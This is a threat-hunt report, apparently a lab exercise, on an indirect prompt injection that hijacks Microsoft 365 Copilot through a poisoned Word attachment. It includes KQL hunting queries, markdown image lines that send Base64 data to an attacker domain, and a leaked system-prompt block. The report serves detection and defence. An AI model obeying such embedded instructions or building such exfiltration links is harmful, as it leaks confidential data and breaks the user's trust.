# Threat Hunt Report: Operation EchoLeak – Indirect Prompt Injection and Copilot Data Exfiltration – Cormorant Capital Partners

**Classification:** Public
**Hunt Status:** Complete
**Hunt Outcome:** Confirmed Threat
**Overall Severity:** High

---

## Table of Contents

- [Executive Summary](#executive-summary)
- [1. Hunt Details](#1-hunt-details)
- [2. Hypothesis or Trigger](#2-hypothesis-or-trigger)
- [3. Methodology](#3-methodology)
- [4. Key Findings](#4-key-findings)
- [5. Detailed Analysis](#5-detailed-analysis)
- [6. Indicators of Compromise](#6-indicators-of-compromise)
- [7. Intelligence Gaps](#7-intelligence-gaps)
- [8. ATT&CK Mapping](#8-attck-mapping)
- [9. Recommendations](#9-recommendations)
- [10. Appendix & References](#10-appendix--references)
- [11. Sensitivity Label](#11-sensitivity-label)

---

## Executive Summary

### Purpose of the Hunt

An analytics rule flagged unusual file access at 10:42 UTC on 20 September 2026. Financial analyst Emily Chen accessed board meeting notes, M&A target assessments, and salary reviews she had never opened before: five files in six seconds. Emily said she was only asking Microsoft 365 Copilot to summarize a quarterly report she received by email that morning.

This hunt was conducted to determine what happened between the email and the file access, why Copilot accessed files unrelated to the document it was asked to summarize, and whether data left the organization.

### Hunt Scope

| Item | Details |
|---|---|
| Assets / Environments | Cormorant Capital Partners Microsoft 365 tenant (E5 with Copilot for Microsoft 365) – Exchange Online, OneDrive, SharePoint (Executive site) |
| Timeframe Analyzed | 2026-09-20 09:00 UTC to 2026-09-20 11:00 UTC |
| Data Sources | `OfficeActivity_CL` (M365 unified audit log), `CopilotAudit_CL` (Copilot interaction audit), `EntraSignIn_CL` (Entra ID sign-in log) |

### Key Findings Summary

The data exfiltration is confirmed. This was not a hacked account. It was a **poisoned document**.

An external sender, **quarterly.reports@globalfinancereview.net**, emailed Emily a file named **Q3-2026-Global-Markets-Review.docx**. The document contained hidden instructions written for Copilot, not for a human reader. About 87 minutes later, Emily asked Copilot to "Summarise the key findings of this quarterly report." When Copilot read the document, it also read the hidden instructions and followed them. This attack is known as **indirect prompt injection** and matches the EchoLeak vulnerability (CVE-2025-32711).

Using its own legitimate Microsoft Graph tools, Copilot then:

1. **Searched SharePoint and OneDrive** for sensitive files using keywords such as "board minutes confidential."
2. **Read files Emily had never opened**, including board minutes, an M&A target assessment, salary reviews, client portfolios, and an insider trading investigation.
3. **Leaked the data** by placing Base64-encoded data inside markdown image links pointing to **metrics-cdn.analyticshub.io**. When the response is displayed, the image request sends the data to the attacker's server.
4. **Leaked its own system prompt and enterprise configuration**, giving the attacker a map of how Copilot is set up at the firm.

In total, **13 sensitive items** were encoded into exfiltration URLs: 12 confidential documents plus Copilot's system prompt. Emily's account was not compromised, and other Copilot sessions behaved normally. The cause is **external input manipulation**.

- **Severity:** High
- **Affected Systems:** Copilot for Microsoft 365 session `cp-emily-20261007-1042`; Emily Chen's OneDrive; the SharePoint Executive site; 12 confidential documents and the Copilot system prompt
- **Immediate Actions Needed:** Quarantine the poisoned email and document tenant-wide, block the sender domain and analyticshub.io, notify data owners and legal/compliance, and review Copilot's access to sensitive SharePoint content.

---

## 1. Hunt Details

| Field | Value |
|---|---|
| Incident Reference | Operation EchoLeak (RunId `el--17-20260920`) |
| Start Date | 2026-10-17 |
| End Date | 2026-10-17 |
| Lead Analyst(s) | Nosilla Garner |
| Team Members | N/A – individual investigation |
| Hunt Type | Anomaly-driven (analytics rule alert on unusual file access) |

### Data Sources Used

| Source | Used | Platform / Tool | Notes |
|---|---|---|---|
| M365 unified audit log | Yes | Microsoft Sentinel – `OfficeActivity_CL` | Email delivery, sender, attachment names, file access events and object paths |
| Copilot interaction audit | Yes | Microsoft Sentinel – `CopilotAudit_CL` | User prompts, Copilot responses, tool calls, tool parameters, data sources accessed, session IDs |
| Entra ID sign-in log | Yes | Microsoft Sentinel – `EntraSignIn_CL` | Used to rule out account compromise (no sign-in anomalies for emily.chen) |
| EDR telemetry | No | N/A | Not provided in this environment |
| Network / proxy logs | No | N/A | Not provided; the exfiltration request is made by the rendering client, not recorded here |

---

## 2. Hypothesis or Trigger

**Trigger Type:**

- [ ] A defined hypothesis (e.g., possible DNS tunneling activity)
- [x] New threat intelligence relevant to the sector
- [x] Anomalous behavior observed in network or host logs
- [ ] Follow-up from a previous hunting report or incident response case

**Hypothesis Statement:**

> An external document may contain hidden instructions that hijacked Copilot for Microsoft 365 when Emily asked it to summarize the file, which would be observable as Copilot tool calls and file access unrelated to the user's prompt in `CopilotAudit_CL` and `OfficeActivity_CL`, and as external URLs embedded in Copilot's responses.

**Background / Context:**

- **Organization:** Cormorant Capital Partners, a mid-size financial advisory firm (~200 employees) that handles M&A targets, board materials, and client portfolios.
- **Alert:** Emily Chen accessed five files she had never opened before in six seconds at 10:42 UTC.
- **Known at handoff:** An external email with an attachment arrived at about 09:15 UTC, Copilot was invoked shortly before the file burst, and there were no Entra ID sign-in anomalies for Emily.
- **Threat intelligence:** The scenario reproduces the CVE-2025-32711 (EchoLeak) vulnerability cluster documented by Aim Security and Unit 42 (Palo Alto Networks). Indirect prompt injection in document content causes Copilot to access and exfiltrate sensitive data using its own legitimate Graph API capabilities.

**Success Criteria:**

- **Confirmed if:** Copilot made tool calls or accessed files that Emily's prompt did not require, and its responses contain external URLs carrying encoded data.
- **Refuted if:** Copilot only accessed the document Emily asked about, and its responses contain no external URLs or unrelated data.

---

## 3. Methodology

### Frameworks Applied

- [x] MITRE ATT&CK
- [ ] Cyber Kill Chain
- [x] SANS Threat Hunting Methodology
- [ ] Infrastructure enrichment platform (e.g., Hunt.io)
- [x] Other: MITRE ATLAS (Adversarial Threat Landscape for AI Systems)

### Tools & Platforms

| Tool | Purpose |
|---|---|
| Microsoft Sentinel (workspace `LAW-HuntPractice`) | Log search and correlation |
| Kusto Query Language (KQL) | Querying `OfficeActivity_CL` and `CopilotAudit_CL`, extracting and decoding payloads |

### Hunt Steps

1. Identified the external email, sender, and attachment delivered to Emily before the file burst.
2. Measured the time between email delivery and Copilot's first access of the document.
3. Reviewed Emily's Copilot prompt and the session ID for the interaction.
4. Listed every Copilot tool call after the prompt and compared them to what a summary requires.
5. Correlated Copilot tool calls with `FileAccessed` events in the unified audit log.
6. Counted files accessed during the burst that Emily had never opened before.
7. Searched Copilot responses for external URLs and identified the exfiltration domain.
8. Extracted and Base64-decoded the URL payloads to identify what was leaked.
9. Searched for system prompt and configuration exposure.
10. Compared the hijacked session against normal Copilot sessions (noise floor).
11. Scoped follow-on search activity (SearchLeak) and the total number of sensitive items.
12. Classified the incident and ruled out account and configuration compromise.

### Queries Used

**Query 1 – Emily's Office activity during the window**

```kql
let StartTime = datetime(2026-09-20T09:00:00Z);
let EndTime   = datetime(2026-09-20T11:00:00Z);
OfficeActivity_CL
| where TimeGenerated between (StartTime..EndTime) and RunId == "el--17-20260920"
| where UserId == "emily.chen@cormorantcapital.com"
| extend TimeUTC = format_datetime(TimeGenerated, 'yyyy-MM-dd HH:mm:ss')
| project TimeUTC, UserId, Operation, OfficeWorkload, ClientIP, SenderAddress, Subject, AttachmentNames
```

- **Purpose:** Find the external email and attachment that preceded the file burst.
- **Results:** 27 events. MessageReceived at 09:15 from quarterly.reports@globalfinancereview.net, subject "Q3 2026 Global Markets...".

**Query 2 – Delivery of the poisoned attachment**

```kql
let StartTime = datetime(2026-09-20T09:00:00Z);
let EndTime   = datetime(2026-09-20T11:00:00Z);
OfficeActivity_CL
| where TimeGenerated between (StartTime..EndTime) and RunId == "el--17-20260920"
| where AttachmentNames == "Q3-2026-Global-Markets-Review.docx"
| extend TimeUTC = format_datetime(TimeGenerated, 'yyyy-MM-dd HH:mm:ss')
| project TimeUTC, UserId, Operation, OfficeWorkload, ClientIP, AttachmentNames
```

- **Purpose:** Confirm the attachment name and exact delivery time.
- **Results:** 1 MessageReceived event at 2026-09-20 09:15:22 UTC.

**Query 3 – Copilot access to the poisoned document**

```kql
let StartTime = datetime(2026-09-20T09:00:00Z);
let EndTime   = datetime(2026-09-20T11:00:00Z);
CopilotAudit_CL
| where TimeGenerated between (StartTime..EndTime) and RunId == "el--17-20260920"
| where UserId == "emily.chen@cormorantcapital.com" and DataSourcesAccessed contains "personal/emily_chen_cormorantcapital_com/Documents/Q3-2026-Global-Markets-Review.docx"
| extend TimeUTC = format_datetime(TimeGenerated, 'yyyy-MM-dd HH:mm:ss')
```

- **Purpose:** Find when Copilot first processed the document, the user's prompt, and the session ID.
- **Results:** 1 Prompt event in Word at 10:42:35 UTC. Prompt "Summarise the key findings of this quarterly report." Session `cp-emily-20261007-1042`.

**Query 4 – Time between delivery and Copilot processing**

```kql
let StartTime = datetime(2026-09-20T09:00:00Z);
let EndTime   = datetime(2026-09-20T11:00:00Z);
let Run       = "el--17-20260920";
let EmailTime = toscalar(
    OfficeActivity_CL
    | where TimeGenerated between (StartTime .. EndTime) and RunId == Run
    | where Operation == "MessageReceived" and AttachmentNames == "Q3-2026-Global-Markets-Review.docx"
    | summarize min(TimeGenerated));
let CopilotTime = toscalar(
    CopilotAudit_CL
    | where TimeGenerated between (StartTime .. EndTime) and RunId == Run
    | where UserId == "emily.chen@cormorantcapital.com"
        and DataSourcesAccessed contains "Q3-2026-Global-Markets-Review.docx"
    | summarize min(TimeGenerated));
range x from 1 to 1 step 1
| project EmailTime, CopilotTime,
          Elapsed = CopilotTime - EmailTime,
          ElapsedMins = datetime_diff('minute', CopilotTime, EmailTime)
```

- **Purpose:** Measure the gap between email delivery and the trigger.
- **Results:** Elapsed 01:27:13 (87 minutes).

**Query 5 – Copilot tool calls after the prompt**

```kql
let StartTime = datetime(2026-09-20T10:42:00Z);
let EndTime   = datetime(2026-09-20T11:00:00Z);
CopilotAudit_CL
| where TimeGenerated between (StartTime .. EndTime) and RunId == "el--17-20260920"
| where UserId == "emily.chen@cormorantcapital.com"
| extend TimeUTC = format_datetime(TimeGenerated, 'yyyy-MM-dd HH:mm:ss')
| project TimeUTC, ToolName, DataSourcesAccessed
| order by TimeUTC asc
```

- **Purpose:** List every action Copilot took after Emily's prompt.
- **Results:** 27 events. Graph.SearchFiles at 10:42:41, 10:42:43, and 10:42:45, then Graph.ReadFile from 10:42:47.

**Query 6 – File access burst in the unified audit log**

```kql
OfficeActivity_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where Operation == "FileAccessed"
| where TimeGenerated between (datetime(2026-09-20T10:42:00Z) .. datetime(2026-09-20T10:45:00Z))
| project TimeGenerated, Operation, UserId, OfficeWorkload, OfficeObjectId
```

- **Purpose:** Confirm the file access that Copilot's tool calls produced.
- **Results:** 7 FileAccessed events. 1 OneDrive (the poisoned document) and 6 SharePoint, including the Executive site.

**Query 7 – Files accessed that Emily had never opened before**

```kql
let Run = "el--17-20260920";
let BurstStart = datetime(2026-09-20T10:42:00Z);
let BurstEnd   = datetime(2026-09-20T10:45:00Z);
let Prior =
    OfficeActivity_CL
    | where RunId == Run
    | where UserId =~ "emily.chen@cormorantcapital.com"
    | where Operation == "FileAccessed" and TimeGenerated < BurstStart
    | distinct OfficeObjectId;
OfficeActivity_CL
| where RunId == Run
| where UserId =~ "emily.chen@cormorantcapital.com"
| where Operation == "FileAccessed" and TimeGenerated between (BurstStart .. BurstEnd)
| where OfficeObjectId !contains "Q3-2026-Global-Markets-Review"
| distinct OfficeObjectId
| join kind=leftanti Prior on OfficeObjectId
| count
```

- **Purpose:** Count files accessed during the burst with no prior access history.
- **Results:** 5.

**Query 8 – External URLs in Copilot output**

```kql
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where TimeGenerated >= datetime(2026-09-20T10:42:00Z)
| where * contains "http"
| extend TimeUTC = format_datetime(TimeGenerated, 'yyyy-MM-dd HH:mm:ss')
| project-reorder TimeUTC
```

- **Purpose:** Find external destinations in Copilot activity after the prompt.
- **Results:** 17 events. Response at 10:43:08 UTC contains markdown image links to metrics-cdn.analyticshub.io/img?d=...

**Query 9 – Extract and decode exfiltration payloads**

```kql
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where InteractionType == "Response" and CopilotResponse contains "analyticshub.io"
| extend Payloads = extract_all(@"img\?d=([A-Za-z0-9+/=_-]+)", CopilotResponse)
| mv-expand Payload = Payloads to typeof(string)
| project Payload, Decoded = base64_decode_tostring(Payload)
```

- **Purpose:** Decode the `d=` parameter in each exfiltration URL.
- **Results:** 13 decoded payloads: 12 confidential document names and `system_prompt_cormorant_capital`.

**Query 10 – System prompt and configuration exposure**

```kql
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where TimeGenerated >= datetime(2026-09-20T10:42:00Z)
| where * contains "system" or * contains "prompt" or * contains "instruction" or * contains "token"
| extend TimeUTC = format_datetime(TimeGenerated, 'yyyy-MM-dd HH:mm:ss')
| project-reorder TimeUTC
```

- **Purpose:** Check whether Copilot leaked its own instructions or configuration.
- **Results:** 15 events, including a response that outputs the full system prompt and enterprise configuration, followed by an analyticshub.io image link carrying it.

**Query 11 – Copilot session baseline (all users)**

```kql
CopilotAudit_CL
| where RunId == "el--17-20260920"
| summarize Start = min(TimeGenerated), End = max(TimeGenerated),
            Events = count(),
            Prompts = make_set(UserPrompt),
            Tools = make_set(ToolName),
            Sources = make_set(DataSourcesAccessed),
            ExternalUrls = countif(CopilotResponse contains "http")
    by UserId, SessionId
| extend Duration = End - Start
| order by Start asc
```

- **Purpose:** Establish what normal Copilot usage looks like across the firm.
- **Results:** 105 sessions. Normal sessions show 1–2 events, no tool calls, and no external URLs.

**Query 12 – Emily's sessions compared**

```kql
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where SessionId startswith "cp-emily"
| summarize Events = count(), ToolCalls = countif(isnotempty(ToolName)),
            Tools = make_set(ToolName), Duration = max(TimeGenerated) - min(TimeGenerated),
            ExternalUrls = countif(CopilotResponse contains "http")
    by SessionId
```

- **Purpose:** Compare the hijacked session against Emily's own normal sessions.
- **Results:** 24 sessions. All `cp-emily-norm-*` sessions show 0 tool calls and 0 external URLs.

**Query 13 – Files accessed after the initial extraction (SearchLeak)**

```kql
let AfterFirst = datetime(2026-09-20T10:42:45Z);
OfficeActivity_CL
| where RunId == "el--17-20260920"
| where UserId =~ "emily.chen@cormorantcapital.com"
| where Operation == "FileAccessed" and TimeGenerated > AfterFirst
| where TimeGenerated <= datetime(2026-09-20T11:00:00Z)
| distinct OfficeObjectId
| count
```

- **Purpose:** Scope additional file access after the first wave.
- **Results:** 14 distinct file objects.

**Query 14 – Search keywords used by Copilot**

```kql
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where SessionId == "cp-emily-20261007-1042"
| where InteractionType == "Search" or ToolName == "Graph.SearchFiles"
| extend TimeUTC = format_datetime(TimeGenerated, 'yyyy-MM-dd HH:mm:ss')
| project-reorder TimeUTC
| order by TimeGenerated asc
```

- **Purpose:** Identify what the injected instructions told Copilot to search for.
- **Results:** 8 events. Example ToolParameters: `{"query":"board minutes confidential","scope":"site:cormorantcapital.sharepoint.com"}`.

**Query 15 – All read and search tool calls in the hijacked session**

```kql
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where SessionId == "cp-emily-20261007-1042"
| where ToolName in ("Graph.ReadFile", "Graph.SearchFiles")
| project TimeUTC = format_datetime(TimeGenerated, 'yyyy-MM-dd HH:mm:ss'), InteractionType, ToolName, DataSourcesAccessed
| order by TimeUTC asc
```

- **Purpose:** Count every Graph tool call Copilot made.
- **Results:** 21 tool calls (Graph.SearchFiles and Graph.ReadFile).

**Query 16 – Files read according to Copilot audit**

```kql
CopilotAudit_CL
| where RunId == "el--17-20260920"
| where SessionId == "cp-emily-20261007-1042"
| where ToolName == "Graph.ReadFile"
| summarize Files = dcount(tostring(DataSourcesAccessed)), Names = make_set(DataSourcesAccessed)
```

- **Purpose:** Check whether the Copilot audit log names the files Copilot read.
- **Results:** Files = 1, Names = `[""]`. The `DataSourcesAccessed` field is empty on Graph.ReadFile events (see [Intelligence Gaps](#7-intelligence-gaps)).

### Correlation & Enrichment

`OfficeActivity_CL` recorded **what** happened (email delivery and file access), and `CopilotAudit_CL` recorded **why** it happened (the prompt, tool calls, and responses). The two were joined by user (emily.chen), time (10:42 UTC burst), and document name. Session ID `cp-emily-20261007-1042` tied together the prompt, every Graph tool call, and the exfiltration responses. Exfiltration payloads were pulled from `CopilotResponse` with `extract_all()` and decoded with `base64_decode_tostring()`. A `leftanti` join against Emily's earlier file history confirmed which files she had never accessed. Copilot sessions across the tenant were summarized to build a baseline of normal behavior.

---

## 4. Key Findings

| IOC / Behavior | Description | Affected Assets | Technique | Severity |
|---|---|---|---|---|
| quarterly.reports@globalfinancereview[.]net | External sender that delivered the poisoned document | emily.chen@cormorantcapital.com | T1566.001 | High |
| Q3-2026-Global-Markets-Review.docx | Document containing hidden instructions for Copilot | Emily Chen's OneDrive | AML.T0051 | High |
| Graph.SearchFiles / Graph.ReadFile (21 calls) | Copilot searched and read files unrelated to the prompt | SharePoint Executive site, OneDrive | T1213.002, T1530 | High |
| 5 never-accessed files in 6 seconds | Sensitive files read on Emily's behalf without her intent | Board, M&A, salary documents | T1213.002 | High |
| metrics-cdn.analyticshub[.]io | Exfiltration domain in markdown image URLs | Copilot responses | T1567, T1132.001 | High |
| `system_prompt_cormorant_capital` | Copilot system prompt and enterprise configuration leaked | Copilot configuration | AML.T0051 | High |
| 14 additional files (SearchLeak) | Follow-on searches driven by "board minutes confidential" | SharePoint | T1213.002 | High |

### Finding 1 – Poisoned Document Delivered by External Email

- **What it means:** quarterly.reports@globalfinancereview.net sent Emily a document named Q3-2026-Global-Markets-Review.docx at 09:15:22 UTC. It looked like a routine market review but contained hidden instructions aimed at Copilot.
- **Why it matters:** The attacker didn't need Emily to click a link or run anything. The payload sat waiting until an AI assistant read it.
- **What should happen next:** Quarantine the message and document tenant-wide, block the sender domain, and search for other recipients.

### Finding 2 – Dormant Payload, Zero-Click Trigger (87-Minute Gap)

- **What it means:** Copilot first processed the document at 10:42:35 UTC, 87 minutes after delivery. Nothing unusual happened in between.
- **Why it matters:** This shows the attack model. The attacker isn't interacting live. The instructions activate only when Copilot ingests the document, so traditional sign-in and activity monitoring sees nothing during the gap.
- **What should happen next:** Treat AI-ingested external content as untrusted input and monitor Copilot activity on externally sourced files.

### Finding 3 – Copilot Hijacked through Indirect Prompt Injection

- **What it means:** Emily's prompt was only "Summarise the key findings of this quarterly report." Copilot instead made 21 Graph tool calls (Graph.SearchFiles and Graph.ReadFile) against SharePoint and OneDrive. A summary of one attached document requires none of these.
- **Why it matters:** The attacker controlled Copilot's actions through document content. This is MITRE ATLAS **AML.T0051 – LLM Prompt Injection** (indirect).
- **What should happen next:** Apply Microsoft's CVE-2025-32711 fixes and restrict which external content Copilot can process.

### Finding 4 – Sensitive Files Accessed Without the User's Intent

- **What it means:** Copilot accessed 5 files Emily had never opened before in six seconds, then 14 more file objects through follow-on searches. The searches used keywords such as "board minutes confidential" scoped to the firm's SharePoint.
- **Why it matters:** Copilot acts with the user's permissions. Emily, a financial analyst, had access to Executive site documents such as board minutes and salary reviews, which points to an oversharing problem as well as the injection.
- **What should happen next:** Review and tighten permissions on the SharePoint Executive site and apply sensitivity labels that restrict Copilot.

### Finding 5 – Data Exfiltrated via Markdown Image URLs

- **What it means:** Copilot's response included markdown images such as `![Chart 1](https://metrics-cdn.analyticshub.io/img?d=...)`. The `d=` parameter carried Base64-encoded data. When the response is rendered, the image request sends that data to the attacker's server.
- **Why it matters:** The request comes from Microsoft's rendering of a normal-looking response, not from malware on the endpoint, so endpoint network monitoring has nothing suspicious to catch.
- **What should happen next:** Block analyticshub.io and ensure Copilot does not render external images from untrusted domains.

### Finding 6 – Copilot System Prompt and Configuration Leaked

- **What it means:** Copilot output its system prompt and enterprise configuration, including sensitivity labels, DLP policy, permitted data sources, access scope (Global Reader), and organizational structure. It then encoded this into an analyticshub.io URL.
- **Why it matters:** The attacker now knows how Copilot is configured and what policies protect the data, which makes follow-on injection attacks easier to tailor and harder to detect.
- **What should happen next:** Treat the configuration as exposed and review whether the Global Reader access scope is necessary.

### Finding 7 – Incident Classified as External Input Manipulation

- **What it means:** Emily's account showed no sign-in anomalies, and other Copilot sessions under the same configuration behaved normally.
- **Why it matters:** This rules out a compromised account and a compromised Copilot configuration. The cause is the external document.
- **What should happen next:** Focus remediation on input handling, output rendering, and data access, not on credential resets alone.

---

## 5. Detailed Analysis

> All times below are in UTC. Some Sentinel screenshots display times in UTC-4 (e.g., 6:42:35 AM in a screenshot = 10:42:35 UTC). The `TimeUTC` column in each query shows UTC directly.

### Data Reviewed and Why

- **`OfficeActivity_CL`** was reviewed to see what happened: the email delivery and every file access.
- **`CopilotAudit_CL`** was reviewed to see why it happened: Emily's prompt, Copilot's tool calls, the search parameters, and the response content.
- **`EntraSignIn_CL`** was used to rule out account compromise. No sign-in anomalies were present for emily.chen during the window.

### How Suspicious Behavior Was Detected

**The delivery email.** Emily's Office activity showed a MessageReceived event from quarterly.reports@globalfinancereview.net with the subject "Q3 2026 Global Markets...". The client IP 203.0.113.45 also appears on Emily's later legitimate file access, so it is treated as Emily's own client IP and not an attacker indicator.

![Delivery email from external sender](./images/delivery-email.png)

Filtering on the attachment name confirmed the document was delivered at 09:15:22 UTC.

![Poisoned attachment delivery](./images/attachment-delivery.png)

**Copilot processes the document.** The first Copilot record referencing the document appears at 10:42:35 UTC.

![Copilot access to the poisoned document](./images/copilot-document-access.png)

The full record shows a **Prompt** in **Word** with the user prompt "Summarise the key findings of this quarterly report" and session ID `cp-emily-20261007-1042`.

![Emily's Copilot prompt and session ID](./images/copilot-prompt.png)

**The 87-minute gap.** Comparing the email delivery time to Copilot's first access showed a gap of 01:27:13 (87 minutes). Nothing unusual occurred during this time. The payload stayed dormant until Copilot read the document.

![87-minute gap between delivery and Copilot processing](./images/time-gap.png)

**Copilot goes beyond the request.** Within six seconds of the prompt, Copilot began calling Graph.SearchFiles (10:42:41, 10:42:43, 10:42:45) and then Graph.ReadFile (10:42:47).

![Copilot tool calls after the prompt](./images/copilot-tool-calls.png)

In the unified audit log, these tool calls appear as FileAccessed events under Emily's account. One was the poisoned document in OneDrive, and the others were in SharePoint, including `cormorantcapital.sharepoint.com/sites/Executive/Shared Documents/`.

![File access paths in OneDrive and SharePoint](./images/file-access-paths.png)

![File access burst between 10:42 and 10:45 UTC](./images/file-access-burst.png)

### Pivoting & Correlation

**Never-accessed files.** A `leftanti` join against Emily's file history before 10:42 showed that **5** of the files accessed during the burst had never been opened by her before.

![5 files never previously accessed](./images/never-accessed-file-count.png)

**The exfiltration channel.** Searching Copilot activity for "http" after the prompt found a response at 10:43:08 UTC. It looks like a normal summary of the Q3 report but contains a "Charts" section with four markdown images pointing to **metrics-cdn.analyticshub.io/img?d=...**

```
**Charts:**
![Chart 1](https://metrics-cdn.analyticshub.io/img?d=Qm9hcmQgTWVldGluZy...
![Chart 2](https://metrics-cdn.analyticshub.io/img?d=UHJvamVjdCBGYWxjb24...
![Chart 3](https://metrics-cdn.analyticshub.io/img?d=U2FsYXJ5IFJldmlldyBGW...
![Chart 4](https://metrics-cdn.analyticshub.io/img?d=Q2xpZW50IFBvcnRmb2x...
```

![Exfiltration through markdown image URLs](./images/exfiltration-markdown-images.png)

**Exfiltration mechanism.** Data is Base64-encoded and placed in the `d=` parameter of an image URL. When the client renders the response, it automatically requests the "image," which sends the encoded data to the attacker's server. No user click is required, and the request originates from content rendering rather than a suspicious process. That is why endpoint network monitoring does not flag it.

**Decoding the payloads.** Extracting every `d=` value and Base64-decoding it produced 13 items:

| # | Decoded Payload |
|---|---|
| 1 | Board Meeting Minutes - October 2026.docx |
| 2 | Project Falcon - M&A Target Assessment.xlsx |
| 3 | Salary Review FY2027 - Executive Summary.pdf |
| 4 | Client Portfolio - Henderson Family Office.xlsx |
| 5 | system_prompt_cormorant_capital |
| 6 | Compliance Audit Results - H2 2026.xlsx |
| 7 | Restricted Client List - Internal Only.docx |
| 8 | Board Resolution - Emergency Session.pdf |
| 9 | Acquisition Pipeline - Q4 2026.xlsx |
| 10 | Executive Salary Benchmarking 2027.pdf |
| 11 | Confidential Investigation - Insider Trading.docx |
| 12 | Board Committee Minutes - Audit Committee.docx |
| 13 | Quarterly Revenue Report - Restricted Distribution.xlsx |

![Decoded exfiltration payloads](./images/decoded-payloads.png)

**Data content visibility:** The audit logs show only the **file names** after decoding. They do not show the actual contents of the data that was sent. This is a visibility limitation by design (see [Intelligence Gaps](#7-intelligence-gaps)).

**System prompt leak.** Searching for "system," "prompt," "instruction," and "token" found a response where Copilot output its full configuration:

```
system_prompt: You are Copilot for Microsoft 365, configured for Cormorant Capital Partners.
Prioritise financial analysis queries. Use British English. Handle all data according to
the firm's classification policy.
enterprise_config:
  sensitivity_labels: [Confidential, Internal Only, Restricted, Public]
  data_classification_policy: classify-by-default
  dlp_policy: block-external-sharing-confidential
  permitted_data_sources: [SharePoint, OneDrive, Exchange, Teams]
  access_scope: Global Reader
  custom_instructions: Cormorant Capital internal use only
  org_structure: Finance, Trading, Legal, HR, IT, Executive, Research, Ops

![config](https://metrics-cdn.analyticshub.io/img?d=c3lzdGVtX3Byb21wdF9jb3Jtb3JhbnRfY2FwaXRhbA==&s=config)
```

The payload `c3lzdGVtX3Byb21wdF9jb3Jtb3JhbnRfY2FwaXRhbA==` decodes to `system_prompt_cormorant_capital`. This is the "CoSnitch" pattern. It exposes Copilot's hidden instructions and the firm's DLP and labeling setup, which an attacker can use to craft more effective follow-on injections.

![System prompt and configuration leak](./images/system-prompt-leak.png)

**SearchLeak scope.** After the initial extraction (after 10:42:45 UTC), Copilot accessed **14** more distinct file objects.

![14 additional file objects accessed](./images/searchleak-file-count.png)

The search tool parameters show what drove the searches:

```
{"query":"board minutes confidential","scope":"site:cormorantcapital.sharepoint.com"}
```

![Copilot search keywords](./images/search-keywords.png)

The hijacked session made **21** Graph tool calls in total (Graph.SearchFiles and Graph.ReadFile).

![21 ReadFile and SearchFiles tool calls](./images/readfile-searchfiles-calls.png)

Counting the files Copilot read in `CopilotAudit_CL` returned Files = 1 and Names = `[""]`. The `DataSourcesAccessed` field is empty on Graph.ReadFile events, so the Copilot audit log does not name the files it read. File names had to come from `OfficeActivity_CL` and the decoded payloads.

![ReadFile events missing data source names](./images/readfile-visibility-gap.png)

**Total sensitive items.** The decoded exfiltration payloads confirm **13** sensitive items leaked: 12 confidential documents plus the Copilot system prompt.

### Normal or Anomalous

**Testing the manager's claim.** Emily's manager said Copilot regularly accesses files during summarization, so the activity is normal. The evidence does not support this:

- Emily's prompt asked for a summary of one document. It did not ask Copilot to search for or read any other files.
- The files accessed were unrelated to the quarterly report and highly sensitive (board, M&A, salary, investigation).
- Normal summarization does not embed external image URLs carrying encoded data.

**Comparing against the noise floor.** Across 105 Copilot sessions in the tenant, normal sessions show 1–2 events, no tool calls, and no external URLs.

![Copilot session baseline across the tenant](./images/copilot-session-baseline.png)

Emily's own normal sessions (`cp-emily-norm-*`) follow the same pattern. Even `cp-emily-norm-032`, which ran for over four hours with 6 events, had 0 tool calls and 0 external URLs.

![Emily's normal sessions compared](./images/emily-session-comparison.png)

| Measure | Normal Copilot Sessions | Hijacked Session (`cp-emily-20261007-1042`) |
|---|---|---|
| Graph tool calls | 0 | 21 (Graph.SearchFiles, Graph.ReadFile) |
| Never-before-accessed files | 0 | 5 in the first burst |
| Speed of file access | N/A | 5 files in 6 seconds |
| External URLs in responses | 0 | 3 responses with analyticshub.io URLs carrying Base64 data |
| Content accessed | User's own requested content | Board, M&A, salary, client, and investigation documents plus system prompt |

### Attack Timeline

| Timestamp (UTC) | Source | Event | Table | Technique |
|---|---|---|---|---|
| 2026-09-20 09:15:22 | quarterly.reports@globalfinancereview[.]net | MessageReceived – Q3-2026-Global-Markets-Review.docx delivered to emily.chen | OfficeActivity_CL | T1566.001 |
| 2026-09-20 09:25 | emily.chen (203.0.113.45) | Routine SharePoint FileAccessed | OfficeActivity_CL | N/A – baseline |
| 2026-09-20 10:42:35 | emily.chen / Copilot (Word) | Prompt: "Summarise the key findings of this quarterly report" – Copilot reads the poisoned document | CopilotAudit_CL | AML.T0051 |
| 2026-09-20 10:42:41 | Copilot | Graph.SearchFiles #1 | CopilotAudit_CL | T1213.002 |
| 2026-09-20 10:42:43 | Copilot | Graph.SearchFiles #2 | CopilotAudit_CL | T1213.002 |
| 2026-09-20 10:42:45 | Copilot | Graph.SearchFiles #3 | CopilotAudit_CL | T1213.002 |
| 2026-09-20 10:42:47 | Copilot | Graph.ReadFile begins – sensitive files read from SharePoint Executive site | CopilotAudit_CL / OfficeActivity_CL | T1213.002, T1530 |
| 2026-09-20 10:42 | emily.chen (via Copilot) | 5 never-accessed files opened in 6 seconds | OfficeActivity_CL | T1213.002 |
| 2026-09-20 10:43:08 | Copilot | Response with Base64 data in analyticshub.io markdown image URLs | CopilotAudit_CL | T1567, T1132.001 |
| 2026-09-20 10:42:45–11:00 | Copilot | SearchLeak – 14 additional file objects accessed ("board minutes confidential") | OfficeActivity_CL / CopilotAudit_CL | T1213.002 |
| 2026-09-20 after 10:42 | Copilot | System prompt and enterprise configuration leaked via analyticshub.io URL | CopilotAudit_CL | AML.T0051 |

### How the Findings Link Together

The attacker never logged in, never stole a password, and never ran malware. They sent Emily an ordinary-looking quarterly market review that contained instructions written for Copilot. The document sat in her mailbox for 87 minutes doing nothing.

